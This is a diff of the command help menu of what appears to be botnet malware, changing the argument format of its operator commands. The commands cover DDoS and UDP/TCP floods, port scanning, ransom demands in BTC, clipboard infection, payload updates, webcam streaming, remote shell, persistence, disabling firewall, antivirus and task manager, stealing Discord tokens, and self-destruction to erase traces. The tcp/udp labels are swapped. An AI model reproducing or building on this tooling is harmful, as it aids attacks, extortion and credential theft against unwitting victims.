@@ -3,22 +3,22 @@
                                                 ║       COMMAND       ║
           ╔═════════════════════════════════════╩═════════════════════╩════════════════════════════════════╗
           ║     attack <method> <ip> <port> <t> <thread>   ║     attack udp 127.0.0.1 80 60 100            ║
+          ║     pscan <ip> <startport> <endport> <thread>  ║     pscan bot 127.0.0.1 1 100 100             ║
           ║     ddos <method> <url> <thread> <t>           ║     ddos cfb https://google.com 10 5          ║
+          ║     ransom <price> <email> <btc>               ║     ransom $100 mail@mail.com BTC             ║
           ║     nitrogen <amount>                          ║     nitrogen 100                              ║
-          ║     infectclipboard <botName> <url>            ║     Admin privileges required                 ║
-          ║     stopinfectclipboard <botName>              ║     Admin privileges required                 ║  
-          ║     updatepayload <botName> <url>              ║     Admin privileges required                 ║
+          ║     infectclipboard <url>                      ║     Admin privileges required                 ║
+          ║     stopinfectclipboard                        ║     Admin privileges required                 ║  
+          ║     updatepayload <url>                        ║     Admin privileges required                 ║
           ║     webcam <ip> <port>                         ║     Stream webcam footage                     ║
           ║     kill                                       ║     Stop client from listening                ║
-          ║     shell <botName> <cmd>                      ║     Run shell commands                        ║
-          ║     persistence <botName>                      ║     Set persistence                           ║
-          ║     disablefirewall <botName>                  ║     Disable firewall                          ║
-          ║     disableantivirus <botName>                 ║     Disable antivirus                         ║
-          ║     disabletaskmanager <botName>               ║     Disable taskmanager                       ║
-          ║     tokens <botName>                           ║     Grab all stored discord tokens            ║
+          ║     shell <command>                            ║     Run shell commands                        ║
+          ║     persistence                                ║     Set persistence                           ║
+          ║     disablefirewall                            ║     Disable firewall                          ║
+          ║     disableantivirus                           ║     Disable antivirus                         ║
+          ║     disabletaskmanager                         ║     Disable taskmanager                       ║
+          ║     tokens                                     ║     Grab all stored discord tokens            ║
           ║     selfdestruct                               ║     Remove all traces of the BotNet           ║
-          ║     pscan <botName> <ip> <ps> <pe> <thread>    ║     pscan bot 127.0.0.1 1 100 100             ║
-          ║     ransom <botName> <price> <email> <btc>     ║     ransom $100 mail@mail.com BTC             ║
           ╚════════════════════════════════════════════════════════════════════════════════════════════════╝
           
           
@@ -39,8 +39,8 @@
                                                 ╔═════════════════════╗
                                                 ║         I.P         ║
                           ╔═════════════════════╩═════════════════════╩════════════════════╗
-                          ║    tcp             ║   UDP Attack                              ║
-                          ║    udp             ║   TCP Attack                              ║
+                          ║                tcp             ║            UDP Attack         ║
+                          ║                udp             ║            TCP Attack         ║
                           ╚════════════════════════════════════════════════════════════════╝
                           
                                                 ╔═════════════════════╗
